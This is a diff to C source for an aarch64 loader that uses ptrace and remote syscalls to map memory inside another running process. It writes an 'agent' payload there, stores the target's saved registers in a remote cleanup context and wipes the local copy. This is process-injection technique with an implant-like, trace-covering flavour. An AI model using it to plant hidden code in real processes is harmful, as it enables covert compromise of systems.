@@ -1,6 +1,9 @@
 #include <elf.h>
-#include <sys/mman.h>
+#include <stddef.h>
 #include <stdint.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
 #include "agent.h"
 #include "cleanup.h"
 #include "ptrace_aarch64_reg.h"
@@ -62,10 +65,11 @@ int *load_image(struct loader_params *params) {
     struct cleanup clean = {0};
 
     clean.a_size = memsz + PAGESIZE;
+    size_t ctx_map_len    = align_up(sizeof(clean), PAGESIZE);
 
     // map memory region A
     unsigned long syscall_result = 0;
-    remote_syscall(params->pid, params->regs, params->syscall_pc, __NR_mmap, 0, clean.a_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0, &syscall_result);
+    remote_syscall(params->pid, params->regs, params->syscall_pc, __NR_mmap, 0, clean.a_size + ctx_map_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0, &syscall_result);
     clean.a_addr = (uint64_t)syscall_result;
     
     if ((long)clean.a_addr <= 0) return NULL;
@@ -74,6 +78,19 @@ int *load_image(struct loader_params *params) {
 
     // Write payload to region A
     write_payload(params->pid, (long)clean.a_addr, agent, agent_len);
+
+    for (int i = 0; i < 31; i++) {
+        clean.x[i] = params->backup.regs[i];
+    }
+
+    clean.sp = params->backup.sp;
+    clean.pc = params->backup.pc;
+    clean.pstate = params->backup.pstate;
+    clean.tpidr_el0 = params->tls_backup;
+    
+    uintptr_t ctx_remote = clean.a_addr + clean.a_size;
+    write_payload(params->pid, ctx_remote, (unsigned char *)&clean, sizeof(clean));
+    params->cleanup_ctx_addr = ctx_remote;
 
     // apply memory protections
     for (int i = 0; i < seg_count; i++) {
@@ -93,38 +110,6 @@ int *load_image(struct loader_params *params) {
     }
 
     params->entry_point = (void *)(pie_base + hdr->e_entry);
-
-    size_t b_code_map_len = align_up(cleanup_len, PAGESIZE);
-    size_t ctx_map_len    = align_up(sizeof(clean), PAGESIZE);
-    size_t b_alloc_len    = b_code_map_len + ctx_map_len;
-
-    unsigned long b_remote = 0;
-    remote_syscall(params->pid, params->regs, params->syscall_pc, __NR_mmap, 0, b_alloc_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0, &b_remote);
-    
-    uintptr_t ctx_remote = b_remote + b_code_map_len;
-    clean.b_addr = b_remote;
-    clean.b_size = b_alloc_len;
-    
-    clean.x[0] = params->backup.regs[0];
-    for (int i = 1; i < 31; i++) {
-        clean.x[i] = params->backup.regs[i];
-    }
-
-    clean.sp = params->backup.sp;
-    clean.pc = params->backup.pc;
-    clean.pstate = params->backup.pstate;
-    clean.tpidr_el0 = params->tls_backup;
-    clean.page_size = PAGESIZE;
-
-    clean.stub_dst = align_down(clean.sp - PAGESIZE - 256, 16);
-
-    // cleanup code
-    write_payload(params->pid, b_remote, (unsigned char *)&cleanup, cleanup_len);
-    remote_syscall(params->pid, params->regs, params->syscall_pc, __NR_mprotect, b_remote, b_code_map_len, PROT_READ | PROT_EXEC, 0, 0, 0, &syscall_result);
-
-    //struct
-    write_payload(params->pid, ctx_remote, (unsigned char *)&clean, sizeof(clean));
-    params->cleanup_ctx_addr = ctx_remote;
 
     // Wipe the cleanup struct from local memory
     memset(&clean, 0, sizeof(clean));
